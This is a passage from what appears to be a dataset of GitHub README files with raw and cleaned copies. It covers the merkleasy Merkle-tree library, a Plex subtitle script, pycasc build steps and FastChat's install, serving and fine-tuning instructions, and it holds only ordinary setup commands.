for manual inspection by including intermediate, calculated values. However, the
functionality exists as a side-effect of preventing malicious proofs from
tricking the validator -- `test_Tree_verify_does_not_validate_malicious_proof`
contains an example attack.

## verify

Inclusion proofs can be verified using `Tree.verify`:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
leaf = b'leaf1'
proof1 = tree.prove(leaf)
proof2 = tree.prove(b'leaf2')

try:
    Tree.verify(tree.root, leaf, proof1)
    # expected result
    print(f'verified proof {[p.hex() for p in proof1]} for {leaf=}')
except ValueError as e:
    print('invalid proof supplied')
except AssertionError as e:
    print(f'error encountered: {e}')

try:
    Tree.verify(tree.root, leaf, [b'\x99', *proof2])
    print(f'verified proof {[p.hex() for p in proof2]} for {leaf=}')
except ValueError as e:
    # expected result
    print('invalid proof supplied')
except AssertionError as e:
    print(f'error encountered: {e}')

try:
    Tree.verify(tree.root, leaf, proof2)
    print(f'verified proof {[p.hex() for p in proof2]} for {leaf=}')
except ValueError as e:
    print('invalid proof supplied')
except AssertionError as e:
    # expected result
    print(f'error encountered: {e}')
```

This static method parses the proof, interpreting the first byte in each proof
step as a code from `interfaces.ProofOp`. It ensures that the proof starts with
the leaf and ends with the root, and then it follows the proof operations.

If the call to `Tree.verify` is provided invalid parameters or an invalid proof,
it will throw an `AssertionError` or `ValueError`. If all checks pass, it
executes without error and returns `None`.


# ISC License

Copyleft (c) 2023 k98kurz

Permission to use, copy, modify, and/or distribute this software
for any purpose with or without fee is hereby granted, provided
that the above copyleft notice and this permission notice appear in
all copies.

Exceptions: this permission is not granted to Alphabet/Google, Amazon,
Apple, Microsoft, Netflix, Meta/Facebook, Twitter, or Disney; nor is
permission granted to any company that contracts to supply weapons or
logistics to any national military; nor is permission granted to any
national government or governmental agency; nor is permission granted to
any employees, associates, or affiliates of these designated entities.

THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL
WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE
AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR
CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS
OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT,
NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
",k98kurz/merkle
plexprefernonforcedsubs,https://github.com/RileyXX/PlexPreferNonForcedSubs,1,4007,4003,"
# PlexPreferNonForcedSubs


## Short description:
This python script will set all movies and shows in your local Plex library to English non forced subtitles by default. The subtitle selections will apply to your Plex profile and be remembered on other devices.

## Long description:
This script was created with the help of [ChatGPT Open AI](https://chat.openai.com/chat) and further edited and completed by me. It uses [Plex Python Api](https://python-plexapi.readthedocs.io/en/latest/). It will set all movies and shows in your local Plex library to English non forced subtitles by default. The subtitle selections will apply to your Plex profile and be remembered on other devices. Assuming your Plex subtitles settings are setup in your server settings Plex will default to Forced Subtitles by default when they are available for a given item. Plex will not allow you to prefer non forced subtitles natively hence why this script was created.

This script is confirmed tested and working. Feel free to use this code for your own purposes. I will be running this code periodically on my home server along with some of my other neat little plex scripts like [Plex Auto Delete](https://github.com/Casvt/Plex-scripts/blob/main/changing_settings/plex_auto_delete.py). Thanks to [all](https://stackoverflow.com/questions/75027919/python-script-to-set-all-subtitles-for-movies-shows-in-plex-to-english-non-for) who helped! If you use this script and run into any bugs feel free to open an issue. Cheers!

## What are ""non-forced"" subtitles?
Non-forced subtitles provide subtitles everytime a characters speaks.

## What are ""forced"" subtitles?
Forced subtitles only provide subtitles when the characters speak a foreign or alien language.


## Install Instructions:
1. Install [Python](https://www.python.org/downloads/).
2. Run `python -m pip install PlexPreferNonForcedSubs` in command line.
3. Make sure Plex media server is running then run the script using `PlexPreferNonForcedSubs` in command line.
4. On first run the script will ask you to fill in your [Plex token](https://www.plexopedia.com/plex-media-server/general/plex-token/). Your token will be saved locally in the same folder as token.txt.
5. Done

_Note: This script should work on any OS where Python is installed (Windows, MacOS and Linux etc)._

### Run:
`PlexPreferNonForcedSubs` in command line.

### Update:
`python -m pip install PlexPreferNonForcedSubs --upgrade` in command line.
### Uninstall:
`python -m pip uninstall PlexPreferNonForcedSubs` in command line.

## Known issues/future outlook:
* Several lines of redundant code can be shortened and/or removed

## Also posted on:
* [Stackoverflow](https://stackoverflow.com/q/75027919/9196825)
* [Reddit](https://www.reddit.com/r/PleX/comments/105gdh7/python_code_to_set_all_movies_and_shows_in_plex/)
* [Plex Forums](https://forums.plex.tv/t/python-script-to-set-all-movies-and-shows-in-plex-to-use-english-non-forced-subtitles/825871)

## Screenshots:
##### Plex subtitle dropdown after script is done running:
![Plex Subtitle Dropdown](https://i.imgur.com/BNOlwtL.png)
##### PlexPreferNonForcedSubs.py script in action:
![PlexPreferNonForcedSubs.py Script in Action](https://github.com/RileyXX/PlexPreferNonForcedSubs/raw/main/demo.gif)

## Donations, Sponsorships and Custom Projects:
Like my scripts? Become a [sponsor](https://github.com/sponsors/RileyXX) and support my projects! See below for other donation options. Need help with a project? Open an issue and I will try my best to help! For other inquiries and custom projects contact me on [Twitter](https://twitter.com/RileyxBell).

#### More donation options:
- Cashapp: `$rileyxx`
- Venmo: `@rileyxx`
- Bitcoin: `bc1qrjevwqv49z8y77len3azqfghxrjmrjvhy5zqau`
- Amazon Wishlist: [Link ↗](https://www.amazon.com/hz/wishlist/ls/WURF5NWZ843U)

<br>

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

","
# PlexPreferNonForcedSubs


## Short description:
This python script will set all movies and shows in your local Plex library to English non forced subtitles by default. The subtitle selections will apply to your Plex profile and be remembered on other devices.

## Long description:
This script was created with the help of [ChatGPT Open AI](https://chat.openai.com/chat) and further edited and completed by me. It uses [Plex Python Api](https://python-plexapi.readthedocs.io/en/latest/). It will set all movies and shows in your local Plex library to English non forced subtitles by default. The subtitle selections will apply to your Plex profile and be remembered on other devices. Assuming your Plex subtitles settings are setup in your server settings Plex will default to Forced Subtitles by default when they are available for a given item. Plex will not allow you to prefer non forced subtitles natively hence why this script was created.

This script is confirmed tested and working. Feel free to use this code for your own purposes. I will be running this code periodically on my home server along with some of my other neat little plex scripts like [Plex Auto Delete](https://github.com/Casvt/Plex-scripts/blob/main/changing_settings/plex_auto_delete.py). Thanks to [all](https://stackoverflow.com/questions/75027919/python-script-to-set-all-subtitles-for-movies-shows-in-plex-to-english-non-for) who helped! If you use this script and run into any bugs feel free to open an issue. Cheers!

## What are ""non-forced"" subtitles?
Non-forced subtitles provide subtitles everytime a characters speaks.

## What are ""forced"" subtitles?
Forced subtitles only provide subtitles when the characters speak a foreign or alien language.


## Install Instructions:
1. Install [Python](https://www.python.org/downloads/).
2. Run `python -m pip install PlexPreferNonForcedSubs` in command line.
3. Make sure Plex media server is running then run the script using `PlexPreferNonForcedSubs` in command line.
4. On first run the script will ask you to fill in your [Plex token](https://www.plexopedia.com/plex-media-server/general/plex-token/). Your token will be saved locally in the same folder as token.txt.
5. Done

_Note: This script should work on any OS where Python is installed (Windows, MacOS and Linux etc)._

### Run:
`PlexPreferNonForcedSubs` in command line.

### Update:
`python -m pip install PlexPreferNonForcedSubs --upgrade` in command line.
### Uninstall:
`python -m pip uninstall PlexPreferNonForcedSubs` in command line.

## Known issues/future outlook:
* Several lines of redundant code can be shortened and/or removed

## Also posted on:
* [Stackoverflow](https://stackoverflow.com/q/75027919/9196825)
* [Reddit](https://www.reddit.com/r/PleX/comments/105gdh7/python_code_to_set_all_movies_and_shows_in_plex/)
* [Plex Forums](https://forums.plex.tv/t/python-script-to-set-all-movies-and-shows-in-plex-to-use-english-non-forced-subtitles/825871)

## Screenshots:
##### Plex subtitle dropdown after script is done running:
![Plex Subtitle Dropdown](https://i.imgur.com/BNOlwtL.png)
##### PlexPreferNonForcedSubs.py script in action:
![PlexPreferNonForcedSubs.py Script in Action](https://github.com/RileyXX/PlexPreferNonForcedSubs/raw/main/demo.gif)

## Donations, Sponsorships and Custom Projects:
Like my scripts? Become a [sponsor](https://github.com/sponsors/RileyXX) and support my projects! See below for other donation options. Need help with a project? Open an issue and I will try my best to help! For other inquiries and custom projects contact me on [Twitter](https://twitter.com/RileyxBell).

#### More donation options:
- Cashapp: `$rileyxx`
- Venmo: `@rileyxx`
- Bitcoin: `bc1qrjevwqv49z8y77len3azqfghxrjmrjvhy5zqau`
- Amazon Wishlist: [Link ↗](https://www.amazon.com/hz/wishlist/ls/WURF5NWZ843U)



[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

",rileyxx/plexprefernonforcedsubs
casc,https://github.com/Meithal/pycasc,0,381,381,"Dependencies
---

- `git` in PATH
- `cmake` in PATH
- Visual Studio build tools or a C compiler 
  able to build python extensions on your 
  platform https://visualstudio.microsoft.com/fr/visual-cpp-build-tools/
- `pip install check-wheel-contents`

Install
---

```shell
python ./setup.py build
```

Create wheel

```shell
python ./setup.py bdist_wheel
```
","Dependencies
---

- `git` in PATH
- `cmake` in PATH
- Visual Studio build tools or a C compiler 
  able to build python extensions on your 
  platform https://visualstudio.microsoft.com/fr/visual-cpp-build-tools/
- `pip install check-wheel-contents`

Install
---

```shell
python ./setup.py build
```

Create wheel

```shell
python ./setup.py bdist_wheel
```
",meithal/pycasc
ytchat,https://github.com/yantao0527/fastchat,20,13667,13304,"# FastChat
| [Discord](https://discord.gg/h6kCZb72G7) | [Twitter](https://twitter.com/lmsysorg) |

An open platform for training, serving, and evaluating large language model based chatbots.

## Release
<p align=""center"">
<a href=""https://vicuna.lmsys.org""><img src=""assets/vicuna_logo.jpeg"" width=""20%""></a>
</p>

- 🔥 We released **FastChat-T5** compatible with commercial usage. Checkout [weights](#fastchat-t5).

- 🔥 We released **Vicuna: An Open-Source Chatbot Impressing GPT-4 with 90% ChatGPT Quality**. Checkout the blog [post](https://vicuna.lmsys.org) and [demo](https://chat.lmsys.org/).

<a href=""https://chat.lmsys.org""><img src=""assets/demo_narrow.gif"" width=""70%""></a>

## Contents
- [Install](#install)
- [Vicuna Weights](#vicuna-weights)
- [Inference with Command Line Interface](#inference-with-command-line-interface)
- [Serving with Web GUI](#serving-with-web-gui)
- [API](#api)
- [Evaluation](#evaluation)
- [Fine-tuning](#fine-tuning)

## Install

### Method 1: With pip

```bash
pip3 install fschat
```

### Method 2: From source

1. Clone this repository and navigate to the FastChat folder
```bash
git clone https://github.com/lm-sys/FastChat.git
cd FastChat
```

If you are running on Mac:
```bash
brew install rust cmake
```

2. Install Package
```bash
pip3 install --upgrade pip  # enable PEP 660 support
pip3 install -e .
```

## Vicuna Weights
We release [Vicuna](https://vicuna.lmsys.org/) weights as delta weights to comply with the LLaMA model license.
You can add our delta to the original LLaMA weights to obtain the Vicuna weights. Instructions:

1. Get the original LLaMA weights in the huggingface format by following the instructions [here](https://huggingface.co/docs/transformers/main/model_doc/llama).
2. Use the following scripts to get Vicuna weights by applying our delta. They will automatically download delta weights from our Hugging Face [account](https://huggingface.co/lmsys).

**NOTE**:
Weights v1.1 are only compatible with ```transformers>=4.28.0``` and ``fschat >= 0.2.0``.
Please update your local packages accordingly. If you follow the above commands to do a fresh install, then you should get all the correct versions.

### Vicuna-7B
This conversion command needs around 30 GB of CPU RAM.
See the ""Low CPU Memory Conversion"" section below if you do not have enough memory.
```bash
python3 -m fastchat.model.apply_delta \
    --base-model-path /path/to/llama-7b \
    --target-model-path /output/path/to/vicuna-7b \
    --delta-path lmsys/vicuna-7b-delta-v1.1
```

### Vicuna-13B
This conversion command needs around 60 GB of CPU RAM.
See the ""Low CPU Memory Conversion"" section below if you do not have enough memory.
```bash
python3 -m fastchat.model.apply_delta \
    --base-model-path /path/to/llama-13b \
    --target-model-path /output/path/to/vicuna-13b \
    --delta-path lmsys/vicuna-13b-delta-v1.1
```

### Fastchat-T5
This model is stored in a Hugging Face [repo](https://huggingface.co/lmsys/fastchat-t5-3b-v1.0). Simply run the line below to start chatting.
```bash
python3 -m fastchat.serve.cli --model-path lmsys/fastchat-t5-3b-v1.0
```

### Old weights
See [docs/weights_version.md](docs/weights_version.md) for all versions of weights and their differences.


### Low CPU Memory Conversion
You can try these methods to reduce the CPU RAM requirement of weight conversion.
1. Append `--low-cpu-mem` to the commands above, which will split large weight files into smaller ones and use the disk as temporary storage. This can keep the peak memory at less than 16GB.
2. Create a large swap file and rely on the operating system to automatically utilize the disk as virtual memory.

## Inference with Command Line Interface

(Experimental Feature: You can specify `--style rich` to enable rich text output and better text streaming quality for some non-ASCII content. This may not work properly on certain terminals.)

<a href=""https://chat.lmsys.org""><img src=""assets/screenshot_cli.png"" width=""70%""></a>

#### Single GPU
The command below requires around 28GB of GPU memory for Vicuna-13B and 14GB of GPU memory for Vicuna-7B.
See the ""No Enough Memory"" section below if you do not have enough memory.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights
```

#### Multiple GPUs
You can use model parallelism to aggregate GPU memory from multiple GPUs on the same machine.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --num-gpus 2
```

#### CPU Only
This runs on the CPU only and does not require GPU. It requires around 60GB of CPU memory for Vicuna-13B and around 30GB of CPU memory for Vicuna-7B.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --device cpu
```

#### Metal Backend (Mac Computers with Apple Silicon or AMD GPUs)
Use `--device mps` to enable GPU acceleration on Mac computers (requires torch >= 2.0).
Use `--load-8bit` to turn on 8-bit compression.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --device mps --load-8bit
```
Vicuna-7B can run on a 32GB M1 Macbook with 1 - 2 words / second.


#### No Enough Memory or Other Platforms
If you do not have enough memory, you can enable 8-bit compression by adding `--load-8bit` to commands above.
This can reduce memory usage by around half with slightly degraded model quality.
It is compatible with the CPU, GPU, and Metal backend.
Vicuna-13B with 8-bit compression can run on a single NVIDIA 3090/4080/V100(16GB) GPU.

```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --load-8bit
```

Besides, we are actively exploring more methods to make the model easier to run on more platforms.
Contributions and pull requests are welcome.

## Serving with Web GUI

<a href=""https://chat.lmsys.org""><img src=""assets/screenshot_gui.png"" width=""70%""></a>

To serve using the web UI, you need three main components: web servers that interface with users, model workers that host one or more models, and a controller to coordinate the webserver and model workers. Here are the commands to follow in your terminal:

#### Launch the controller
```bash
python3 -m fastchat.serve.controller
```

This controller manages the distributed workers.

#### Launch the model worker
```bash
python3 -m fastchat.serve.model_worker --model-path /path/to/vicuna/weights
```
Wait until the process finishes loading the model and you see ""Uvicorn running on ..."". You can launch multiple model workers to serve multiple models concurrently. The model worker will connect to the controller automatically.

To ensure that your model worker is connected to your controller properly, send a test message using the following command:
```bash
python3 -m fastchat.serve.test_message --model-name vicuna-13b
```

#### Launch the Gradio web server
```bash
python3 -m fastchat.serve.gradio_web_server
```

This is the user interface that users will interact with.

By following these steps, you will be able to serve your models using the web UI. You can open your browser and chat with a model now.


## API

### Huggingface Generation APIs
See [fastchat/serve/huggingface_api.py](fastchat/serve/huggingface_api.py)

### OpenAI-compatible RESTful APIs & SDK

(Experimental. We will keep improving the API and SDK.)

#### Chat Completion

Reference: https://platform.openai.com/docs/api-reference/chat/create

Some features/compatibilities to be implemented:

- [ ] streaming
- [ ] support of some parameters like `top_p`, `presence_penalty`
- [ ] proper error handling (e.g. model not found)
- [ ] the return value in the client SDK could be used like a dict


**RESTful API Server**

First, launch the controller

```bash
python3 -m fastchat.serve.controller
```

Then, launch the model worker(s)

```bash
python3 -m fastchat.serve.model_worker --model-name 'vicuna-7b-v1.1' --model-path /path/to/vicuna/weights
```

Finally, launch the RESTful API server

```bash
export FASTCHAT_CONTROLLER_URL=http://localhost:21001
python3 -m fastchat.serve.api --host localhost --port 8000
```

Test the API server

```bash
curl http://localhost:8000/v1/chat/completions \
  -H ""Content-Type: application/json"" \
  -d '{
    ""model"": ""vicuna-7b-v1.1"",
    ""messages"": [{""role"": ""user"", ""content"": ""Hello!""}]
  }'
```

**Client SDK**

Assuming environment variable `FASTCHAT_BASEURL` is set to the API server URL (e.g., `http://localhost:8000`), you can use the following code to send a request to the API server:

```python
import os
from fastchat import client

client.set_baseurl(os.getenv(""FASTCHAT_BASEURL""))

completion = client.ChatCompletion.create(
  model=""vicuna-7b-v1.1"",
  messages=[
    {""role"": ""user"", ""content"": ""Hello!""}
  ]
)

print(completion.choices[0].message)
```

## Evaluation

Our AI-enhanced evaluation pipeline is based on GPT-4. This section provides a high-level summary of the pipeline. For detailed instructions, please refer to the [evaluation](fastchat/eval) documentation.

### Pipeline Steps

1. Generate answers from different models: Use `qa_baseline_gpt35.py` for ChatGPT, or specify the model checkpoint and run `get_model_answer.py` for Vicuna and other models.

2. Generate reviews with GPT-4: Use GPT-4 to generate reviews automatically. This step can also be performed manually if the GPT-4 API is not available to you.

3. Generate visualization data: Run `generate_webpage_data_from_table.py` to generate data for a static website, which allows you to visualize the evaluation data.

4. Visualize the data: Serve a static website under the `webpage` directory. You can use `python3 -m http.server` to serve the website locally.

### Data Format and Contribution

We use a data format encoded with JSON Lines for evaluation. The format includes information on models, prompts, reviewers, questions, answers, and reviews.

You can customize the evaluation process or contribute to our project by accessing the relevant [data](fastchat/eval/table/).

For detailed instructions, please refer to the [evaluation](fastchat/eval) documentation.

## Fine-tuning
### Data

Vicuna is created by fine-tuning a LLaMA base model using approximately 70K user-shared conversations gathered from ShareGPT.com with public APIs. To ensure data quality, we convert the HTML back to markdown and filter out some inappropriate or low-quality samples. Additionally, we divide lengthy conversations into smaller segments that fit the model's maximum context length. For detailed instructions to clean the ShareGPT data, check out [here](docs/commands/data_cleaning.md).

Due to some concerns, we may not release the ShareGPT dataset at the moment. If you would like to try the fine-tuning code, you can run it with some dummy questions in [dummy.json](playground/data/dummy.json). You can follow the same format and plug in your own data.

### Code and Hyperparameters
Our code is based on [Stanford Alpaca](https://github.com/tatsu-lab/stanford_alpaca) with additional support for multi-round conversations.
We use similar hyperparameters as the Stanford Alpaca.

| Hyperparameter | Global Batch Size | Learning rate | Epochs | Max length | Weight decay |
| --- | ---: | ---: | ---: | ---: | ---: |
| Vicuna-13B | 128 | 2e-5 | 3 | 2048 | 0 |

### Fine-tuning Vicuna-7B with Local GPUs
You can use the following command to train Vicuna-7B with 4 x A100 (40GB).
```bash
torchrun --nproc_per_node=4 --master_port=20001 fastchat/train/train_mem.py \
    --model_name_or_path ~/model_weights/llama-7b  \
    --data_path playground/data/dummy.json \
    --bf16 True \
    --output_dir output \
    --num_train_epochs 3 \
    --per_device_train_batch_size 2 \
    --per_device_eval_batch_size 2 \
    --gradient_accumulation_steps 16 \
    --evaluation_strategy ""no"" \
    --save_strategy ""steps"" \
    --save_steps 1200 \
    --save_total_limit 10 \
    --learning_rate 2e-5 \
    --weight_decay 0. \
    --warmup_ratio 0.03 \
    --lr_scheduler_type ""cosine"" \
    --logging_steps 1 \
    --fsdp ""full_shard auto_wrap"" \
    --fsdp_transformer_layer_cls_to_wrap 'LlamaDecoderLayer' \
    --tf32 True \
    --model_max_length 2048 \
    --gradient_checkpointing True \
    --lazy_preprocess True
```

If you meet out-of-memory during model saving, see solutions [here](https://github.com/pytorch/pytorch/issues/98823).

### Fine-tuning on Any Cloud with SkyPilot
[SkyPilot](https://github.com/skypilot-org/skypilot) is a framework built by UC Berkeley for easily and cost effectively running ML workloads on any cloud (AWS, GCP, Azure, Lambda, etc.). 
To use SkyPilot, install it with the following command and setup the cloud credentials locally following the instructions [here](https://skypilot.readthedocs.io/en/latest/getting-started/installation.html).
```bash
# Install skypilot from the master branch
pip install git+https://github.com/skypilot-org/skypilot.git
```
#### Vicuna
Vicuna can be trained on 8 A100 GPUs with 80GB memory. The following command will automatically launch a node satisfying the requirement, setup and run the training job on it.
```bash
sky launch -c vicuna -s scripts/train-vicuna.yaml --env WANDB_API_KEY
```
Other options are also valid:
```bash
# Launch it on managed spot to save 3x cost (train Vicuna-13B with around $300)
sky spot launch -n vicuna scripts/train-vicuna.yaml --env WANDB_API_KEY

# Train a 7B model
sky launch -c vicuna -s scripts/train-vicuna.yaml --env WANDB_API_KEY --env MODEL_SIZE=7
```
Note: Please make sure the `WANDB_API_KEY` has been setup on your local machine. You can find the API key on your [wandb profile page](https://wandb.ai/authorize). If you would like to train the model without using wandb, you can replace the `--env WANDB_API_KEY` flag with `--env WANDB_MODE=offline`.
","# FastChat
| [Discord](https://discord.gg/h6kCZb72G7) | [Twitter](https://twitter.com/lmsysorg) |

An open platform for training, serving, and evaluating large language model based chatbots.

## Release




- 🔥 We released **FastChat-T5** compatible with commercial usage. Checkout [weights](#fastchat-t5).

- 🔥 We released **Vicuna: An Open-Source Chatbot Impressing GPT-4 with 90% ChatGPT Quality**. Checkout the blog [post](https://vicuna.lmsys.org) and [demo](https://chat.lmsys.org/).



## Contents
- [Install](#install)
- [Vicuna Weights](#vicuna-weights)
- [Inference with Command Line Interface](#inference-with-command-line-interface)
- [Serving with Web GUI](#serving-with-web-gui)
- [API](#api)
- [Evaluation](#evaluation)
- [Fine-tuning](#fine-tuning)

## Install

### Method 1: With pip

```bash
pip3 install fschat
```

### Method 2: From source

1. Clone this repository and navigate to the FastChat folder
```bash
git clone https://github.com/lm-sys/FastChat.git
cd FastChat
```

If you are running on Mac:
```bash
brew install rust cmake
```

2. Install Package
```bash
pip3 install --upgrade pip  # enable PEP 660 support
pip3 install -e .
```

## Vicuna Weights
We release [Vicuna](https://vicuna.lmsys.org/) weights as delta weights to comply with the LLaMA model license.
You can add our delta to the original LLaMA weights to obtain the Vicuna weights. Instructions:

1. Get the original LLaMA weights in the huggingface format by following the instructions [here](https://huggingface.co/docs/transformers/main/model_doc/llama).
2. Use the following scripts to get Vicuna weights by applying our delta. They will automatically download delta weights from our Hugging Face [account](https://huggingface.co/lmsys).

**NOTE**:
Weights v1.1 are only compatible with ```transformers>=4.28.0``` and ``fschat >= 0.2.0``.
Please update your local packages accordingly. If you follow the above commands to do a fresh install, then you should get all the correct versions.

### Vicuna-7B
This conversion command needs around 30 GB of CPU RAM.
See the ""Low CPU Memory Conversion"" section below if you do not have enough memory.
```bash
python3 -m fastchat.model.apply_delta \
    --base-model-path /path/to/llama-7b \
    --target-model-path /output/path/to/vicuna-7b \
    --delta-path lmsys/vicuna-7b-delta-v1.1
```

### Vicuna-13B
This conversion command needs around 60 GB of CPU RAM.
See the ""Low CPU Memory Conversion"" section below if you do not have enough memory.
```bash
python3 -m fastchat.model.apply_delta \
    --base-model-path /path/to/llama-13b \
    --target-model-path /output/path/to/vicuna-13b \
    --delta-path lmsys/vicuna-13b-delta-v1.1
```

### Fastchat-T5
This model is stored in a Hugging Face [repo](https://huggingface.co/lmsys/fastchat-t5-3b-v1.0). Simply run the line below to start chatting.
```bash
python3 -m fastchat.serve.cli --model-path lmsys/fastchat-t5-3b-v1.0
```

### Old weights
See [docs/weights_version.md](docs/weights_version.md) for all versions of weights and their differences.


### Low CPU Memory Conversion
You can try these methods to reduce the CPU RAM requirement of weight conversion.
1. Append `--low-cpu-mem` to the commands above, which will split large weight files into smaller ones and use the disk as temporary storage. This can keep the peak memory at less than 16GB.
2. Create a large swap file and rely on the operating system to automatically utilize the disk as virtual memory.

## Inference with Command Line Interface

(Experimental Feature: You can specify `--style rich` to enable rich text output and better text streaming quality for some non-ASCII content. This may not work properly on certain terminals.)



#### Single GPU
The command below requires around 28GB of GPU memory for Vicuna-13B and 14GB of GPU memory for Vicuna-7B.
See the ""No Enough Memory"" section below if you do not have enough memory.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights
```

#### Multiple GPUs
You can use model parallelism to aggregate GPU memory from multiple GPUs on the same machine.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --num-gpus 2
```

#### CPU Only
This runs on the CPU only and does not require GPU. It requires around 60GB of CPU memory for Vicuna-13B and around 30GB of CPU memory for Vicuna-7B.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --device cpu
```

#### Metal Backend (Mac Computers with Apple Silicon or AMD GPUs)
Use `--device mps` to enable GPU acceleration on Mac computers (requires torch >= 2.0).
Use `--load-8bit` to turn on 8-bit compression.
```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --device mps --load-8bit
```
Vicuna-7B can run on a 32GB M1 Macbook with 1 - 2 words / second.


#### No Enough Memory or Other Platforms
If you do not have enough memory, you can enable 8-bit compression by adding `--load-8bit` to commands above.
This can reduce memory usage by around half with slightly degraded model quality.
It is compatible with the CPU, GPU, and Metal backend.
Vicuna-13B with 8-bit compression can run on a single NVIDIA 3090/4080/V100(16GB) GPU.

```
python3 -m fastchat.serve.cli --model-path /path/to/vicuna/weights --load-8bit
```

Besides, we are actively exploring more methods to make the model easier to run on more platforms.
Contributions and pull requests are welcome.

## Serving with Web GUI



To serve using the web UI, you need three main components: web servers that interface with users, model workers that host one or more models, and a controller to coordinate the webserver and model workers. Here are the commands to follow in your terminal:

#### Launch the controller
```bash
python3 -m fastchat.serve.controller
```

This controller manages the distributed workers.

#### Launch the model worker
```bash
python3 -m fastchat.serve.model_worker --model-path /path/to/vicuna/weights
```
Wait until the process finishes loading the model and you see ""Uvicorn running on ..."". You can launch multiple model workers to serve multiple models concurrently. The model worker will connect to the controller automatically.

To ensure that your model worker is connected to your controller properly, send a test message using the following command:
```bash
python3 -m fastchat.serve.test_message --model-name vicuna-13b
```

#### Launch the Gradio web server
```bash
python3 -m fastchat.serve.gradio_web_server
```

This is the user interface that users will interact with.

By following these steps, you will be able to serve your models using the web UI. You can open your browser and chat with a model now.


## API

### Huggingface Generation APIs
See [fastchat/serve/huggingface_api.py](fastchat/serve/huggingface_api.py)

### OpenAI-compatible RESTful APIs & SDK

(Experimental. We will keep improving the API and SDK.)

#### Chat Completion

Reference: https://platform.openai.com/docs/api-reference/chat/create

Some features/compatibilities to be implemented:

- [ ] streaming
- [ ] support of some parameters like `top_p`, `presence_penalty`
- [ ] proper error handling (e.g. model not found)
- [ ] the return value in the client SDK could be used like a dict


**RESTful API Server**

First, launch the controller

```bash
python3 -m fastchat.serve.controller
```

Then, launch the model worker(s)

```bash
python3 -m fastchat.serve.model_worker --model-name 'vicuna-7b-v1.1' --model-path /path/to/vicuna/weights
```

Finally, launch the RESTful API server

```bash
export FASTCHAT_CONTROLLER_URL=http://localhost:21001
python3 -m fastchat.serve.api --host localhost --port 8000
```

Test the API server

```bash
curl http://localhost:8000/v1/chat/completions \
  -H ""Content-Type: application/json"" \
  -d '{
    ""model"": ""vicuna-7b-v1.1"",
    ""messages"": [{""role"": ""user"", ""content"": ""Hello!""}]
  }'
```

**Client SDK**

Assuming environment variable `FASTCHAT_BASEURL` is set to the API server URL (e.g., `http://localhost:8000`), you can use the following code to send a request to the API server:

```python
import os
from fastchat import client

client.set_baseurl(os.getenv(""FASTCHAT_BASEURL""))

completion = client.ChatCompletion.create(
  model=""vicuna-7b-v1.1"",
  messages=[
    {""role"": ""user"", ""content"": ""Hello!""}
  ]
)

print(completion.choices[0].message)
```

## Evaluation

Our AI-enhanced evaluation pipeline is based on GPT-4. This section provides a high-level summary of the pipeline. For detailed instructions, please refer to the [evaluation](fastchat/eval) documentation.

### Pipeline Steps

1. Generate answers from different models: Use `qa_baseline_gpt35.py` for ChatGPT, or specify the model checkpoint and run `get_model_answer.py` for Vicuna and other models.

2. Generate reviews with GPT-4: Use GPT-4 to generate reviews automatically. This step can also be performed manually if the GPT-4 API is not available to you.

3. Generate visualization data: Run `generate_webpage_data_from_table.py` to generate data for a static website, which allows you to visualize the evaluation data.

4. Visualize the data: Serve a static website under the `webpage` directory. You can use `python3 -m http.server` to serve the website locally.

### Data Format and Contribution

We use a data format encoded with JSON Lines for evaluation. The format includes information on models, prompts, reviewers, questions, answers, and reviews.

You can customize the evaluation process or contribute to our project by accessing the relevant [data](fastchat/eval/table/).

For detailed instructions, please refer to the [evaluation](fastchat/eval) documentation.

## Fine-tuning
### Data

Vicuna is created by fine-tuning a LLaMA base model using approximately 70K user-shared conversations gathered from ShareGPT.com with public APIs. To ensure data quality, we convert the HTML back to markdown and filter out some inappropriate or low-quality samples. Additionally, we divide lengthy conversations into smaller segments that fit the model's maximum context length. For detailed instructions to clean the ShareGPT data, check out [here](docs/commands/data_cleaning.md).

Due to some concerns, we may not release the ShareGPT dataset at the moment. If you would like to try the fine-tuning code, you can run it with some dummy questions in [dummy.json](playground/data/dummy.json). You can follow the same format and plug in your own data.

### Code and Hyperparameters
Our code is based on [Stanford Alpaca](https://github.com/tatsu-lab/stanford_alpaca) with additional support for multi-round conversations.
We use similar hyperparameters as the Stanford Alpaca.

| Hyperparameter | Global Batch Size | Learning rate | Epochs | Max length | Weight decay |
| --- | ---: | ---: | ---: | ---: | ---: |
| Vicuna-13B | 128 | 2e-5 | 3 | 2048 | 0 |

### Fine-tuning Vicuna-7B with Local GPUs
You can use the following command to train Vicuna-7B with 4 x A100 (40GB).
```bash
torchrun --nproc_per_node=4 --master_port=20001 fastchat/train/train_mem.py \
    --model_name_or_path ~/model_weights/llama-7b  \
    --data_path playground/data/dummy.json \
    --bf16 True \
    --output_dir output \
    --num_train_epochs 3 \
    --per_device_train_batch_size 2 \
    --per_device_eval_batch_size 2 \
    --gradient_accumulation_steps 16 \
    --evaluation_strategy ""no"" \
    --save_strategy ""steps"" \
    --save_steps 1200 \
    --save_total_limit 10 \
    --learning_rate 2e-5 \
    --weight_decay 0. \
    --warmup_ratio 0.03 \
